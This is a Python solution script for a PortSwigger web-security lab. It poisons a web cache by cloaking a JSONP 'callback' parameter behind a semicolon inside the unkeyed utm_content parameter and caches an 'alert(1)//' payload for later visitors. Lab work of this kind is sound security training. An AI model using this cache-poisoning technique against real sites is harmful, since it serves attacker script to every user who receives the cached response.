"""
Lab 9: Parameter cloaking
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking
Difficulty: Expert

📝 The app excludes `utm_content` from the cache key. A semicolon lets us
APPEND a second, different parameter onto utm_content's name — the ORIGIN
parses it as two separate params (utm_content AND callback), but the
CACHE's parser treats the whole semicolon-joined string as ONE value under
the already-excluded utm_content key, so our injected callback param rides
along completely unkeyed too.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
# This lab's vulnerable endpoint is typically a JSONP-style analytics
# resource whose callback function name is reflected unsanitized.
VULNERABLE_PATH = "/js/libs/geolocate.js"
MALICIOUS_CALLBACK = "alert(1)//"


def run():
    s = get_session()

    note("Step 1: confirm 'callback' IS normally keyed (changing it alone")
    note("should give a cache miss).")
    r1 = s.get(f"{TARGET}{VULNERABLE_PATH}?callback=a")
    r2 = s.get(f"{TARGET}{VULNERABLE_PATH}?callback=b")
    log(f"callback keyed (different responses/cache behavior expected): "
        f"{cache_status(r1)} vs {cache_status(r2)}")

    note("Step 2: confirm utm_content is unkeyed, then cloak our callback")
    note("value INSIDE it using a semicolon separator.")
    cloaked_url = f"{TARGET}{VULNERABLE_PATH}?utm_content=1;callback={MALICIOUS_CALLBACK}"

    poison_until_hit(s, f"{cloaked_url}&cb=12345")

    note("Step 3: re-poison without the cache-buster.")
    r = poison_until_hit(s, cloaked_url)
    if r:
        log(f"Poisoned, payload present: {MALICIOUS_CALLBACK in r.text}")

    note("Confirm by also sending a plain ?callback=x request afterward —")
    note("it should STILL get the cached (cloaked) response, proving the")
    note("cache never saw 'callback' as a separate, keyed parameter at all.")


if __name__ == "__main__":
    run()
